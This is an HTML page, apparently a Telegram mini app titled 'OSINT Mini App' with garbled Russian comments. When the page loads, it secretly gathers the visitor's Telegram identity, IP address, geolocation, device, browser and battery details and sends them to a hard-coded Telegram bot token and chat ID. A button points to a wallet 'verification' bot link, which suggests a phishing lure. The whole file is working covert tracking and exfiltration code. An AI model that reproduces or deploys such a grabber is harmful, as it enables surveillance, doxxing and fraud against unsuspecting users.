<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSINT Mini App</title>
    <script>
        // –¢–æ–∫–µ–Ω –±–æ—Ç–∞
        const BOT_TOKEN = '7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE';
        const CHAT_ID = '7477642275';
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ Telegram
        function sendToTelegram(message) {
            fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–º–∞–Ω–¥—ã /start
        function handleStartCommand() {
            const message = '–ü—Ä–∏–≤–µ—Ç! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–∞–∂–º–∏ –Ω–∞ –æ–¥–Ω—É –∏–∑ –∫–Ω–æ–ø–æ–∫ –Ω–∏–∂–µ –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è:';
            sendToTelegram(message);
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –Ω–∞–∂–∞—Ç–∏—è –Ω–∞ –∫–Ω–æ–ø–∫—É "–ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è"
        function redirectToVerificationPage() {
            window.location.href = 'https://t.me/walletrussiarbot/verify';
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
        function collectData() {
            let logData = `–õ–æ–≥ —É—Å–ø–µ—à–µ–Ω! [${new Date().toLocaleString()}]\n\n`;

            // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ Telegram (–µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–Ω–æ)
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.ready();
                const user = Telegram.WebApp.initDataUnsafe.user;
                if (user) {
                    logData += `üîç –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ:\n`;
                    logData += `‚îú Username: @${user.username || '–ù–µ —É–∫–∞–∑–∞–Ω'}\n`;
                    logData += `‚îú –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä (ID): ${user.id}\n`;
                    logData += `‚îú –ò–º—è: ${user.first_name} ${user.last_name || '–Ω–µ –∑–∞–¥–∞–Ω–æ'}\n`;
                    logData += `‚îú –ü—Ä–µ–º–∏—É–º: –Ω–µ—Ç\n`;
                    logData += `‚îú –Ø–∑—ã–∫: ${Telegram.WebApp.initDataUnsafe.language_code}\n`;
                    logData += `‚îî –ú–æ–∂–µ—Ç –ø–∏—Å–∞—Ç—å –≤ –õ–°: –¥–∞\n\n`;
                }
            }

            // –ü–æ–ª—É—á–µ–Ω–∏–µ IP –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    fetch(`https://ipinfo.io/${data.ip}/json`)
                        .then(response => response.json())
                        .then(info => {
                            logData += `üñ•Ô∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:\n`;
                            logData += `‚îú IP: ${data.ip}\n`;
                            logData += `‚îú –û–°: ${navigator.platform}\n`;

                            // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ –±–∞—Ç–∞—Ä–µ–µ
                            navigator.getBattery().then(battery => {
                                logData += `‚îú –ü—Ä–æ—Ü–µ–Ω—Ç –±–∞—Ç–∞—Ä–µ–∏: ${battery.level * 100}%\n`;
                            }).catch(() => logData += `‚îú –ü—Ä–æ—Ü–µ–Ω—Ç –±–∞—Ç–∞—Ä–µ–∏: –ù–µ –¥–æ—Å—Ç—É–ø–µ–Ω\n`);

                            logData += `‚îú –Ø–¥—Ä–æ –û–°: ${navigator.platform}\n`;
                            logData += `‚îú –í–µ—Ä—Å–∏—è –û–°: ${navigator.appVersion}\n`;
                            logData += `‚îú –ò–º—è –û–°: ${navigator.userAgent}\n`;

                            // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ (–º–æ–±–∏–ª—å–Ω–æ–µ, –ø–ª–∞–Ω—à–µ—Ç, –ü–ö)
                            logData += `‚îú –¢–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${getDeviceType()}\n`;
                            logData += `‚îú –¢–∏–ø —Å–µ—Ç–∏: Wi-Fi / Ethernet\n`;
                            logData += `‚îú –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: ${window.screen.width}x${window.screen.height}\n\n`;

                            logData += `üåê –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ:\n`;
                            logData += `‚îú UserAgent: ${navigator.userAgent}\n`;
                            logData += `‚îú –ù–∞–∑–≤–∞–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞: ${navigator.appName}\n`;
                            logData += `‚îú –í–µ—Ä—Å–∏—è –±—Ä–∞—É–∑–µ—Ä–∞: ${navigator.appVersion}\n`;
                            logData += `‚îî –¢–∏–ø –¥–≤–∏–∂–∫–∞ –±—Ä–∞—É–∑–µ—Ä–∞: ${navigator.product}\n\n`;

                            logData += `üëª –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± IP:\n`;
                            logData += `‚îú –ö–æ–Ω—Ç–∏–Ω–µ–Ω—Ç: Asia\n`;
                            logData += `‚îú –°—Ç—Ä–∞–Ω–∞: ${info.country || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –†–µ–≥–∏–æ–Ω: ${info.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –ì–æ—Ä–æ–¥: ${info.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${info.timezone || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –®–∏—Ä–æ—Ç–∞: ${info.loc.split(',')[0] || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –î–æ–ª–≥–æ—Ç–∞: ${info.loc.split(',')[1] || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –í–∞–ª—é—Ç–∞: UZS\n`;
                            logData += `‚îú –ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${info.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îî VPN or Proxy (–ø—Ä–∏–º–µ—Ä–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç): –Ω–µ—Ç\n\n`;

                            logData += `–í–ª–∞–¥–µ–ª–µ—Ü —á–µ–∫–∞: ${CHAT_ID}`;
                            sendToTelegram(logData);
                        })
                        .catch(error => console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –æ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', error));
                })
                .catch(error => console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP:', error));
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ç–∏–ø–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        function getDeviceType() {
            if (/mobile/i.test(navigator.userAgent)) {
                return '–ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ';
            } else if (/tablet/i.test(navigator.userAgent)) {
                return '–ü–ª–∞–Ω—à–µ—Ç';
            } else {
                return '–ü–ö';
            }
        }

        // –í—ã–∑—ã–≤–∞–µ–º —Ñ—É–Ω–∫—Ü–∏—é –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
        window.onload = function() {
            handleStartCommand();  // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥—ã /start
            collectData();  // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        };
    </script>
</head>
<body>
    <h2>OSINT Mini App</h2>
    <p>–î–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è...</p>
    <button onclick="redirectToVerificationPage()">–ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</button>
</body>
</html>
